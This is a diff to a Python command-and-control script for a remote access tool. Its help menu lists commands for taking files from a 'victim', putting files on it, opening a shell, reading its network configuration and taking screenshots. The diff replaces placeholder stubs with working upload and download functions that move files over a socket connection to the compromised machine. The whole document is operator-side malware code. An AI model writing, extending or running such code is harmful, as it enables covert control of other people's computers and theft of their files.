@@ -1,14 +1,15 @@
 #!/usr/bin/python3
 from secure_socket import Server
 from sys import argv
+import os
 
 def help():
   print("""
 COMMANDS :
 
   help                   Display this.
-  download [file|path]   Get a file from the victim.
-  upload   [file|path]   Put a file on the victim.
+  download               Get a file from the victim.
+  upload                 Put a file on the victim.
   shell                  Start a shell on the victim.
   ipconfig               Display the victim's IP configuration.
   screenshot             Take a screenshot from the victim's screen.
@@ -47,17 +48,35 @@ def shell(victim):
     cmd=input(prompt)
   victim.send('exit')
 
+def upload(victim):
+  filename_src=input('file to send => ')
+  filename_dst=input('with name => ')
+  if not os.path.isfile(filename_src):
+    print('File not found.')
+    return
+  victim.send('upload')
+  victim.send_file(filename_src, filename_dst)
+  print('done.')
+
+def download(victim):
+  victim.send('download')
+  filename_src=input('file to get => ')
+  filename_dst=input('new name => ')
+  victim.send(f"{filename_src}*{filename_dst}")
+  ret=victim.receive()
+  print(ret)
+  if ret!='File not found.':
+    victim.receive_file()
+
 def run_command(server, cmd):
   command=cmd.split(" ")[0]
   match command:
     case 'help':
       help()
     case 'download':
-      print('command still in dev :/')
-      #download(cmd.split(" ")[1:])
+      download(server)
     case 'upload':
-      print('command still in dev :/')
-      #upload(cmd.split(" ")[1:])
+      upload(server)
     case 'shell':
       shell(server)
     case 'ipconfig':
